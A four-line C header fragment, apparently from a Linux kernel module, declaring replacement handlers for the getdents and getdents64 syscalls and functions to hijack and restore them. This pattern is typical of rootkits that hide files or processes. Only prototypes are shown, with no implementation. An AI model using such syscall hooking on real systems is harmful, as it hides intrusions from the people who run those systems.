static long new_getdents64(const struct pt_regs *pt_regs);
static long new_getdents(const struct pt_regs *pt_regs);
void hijack_getdents(void);
void restore_getdents(void);
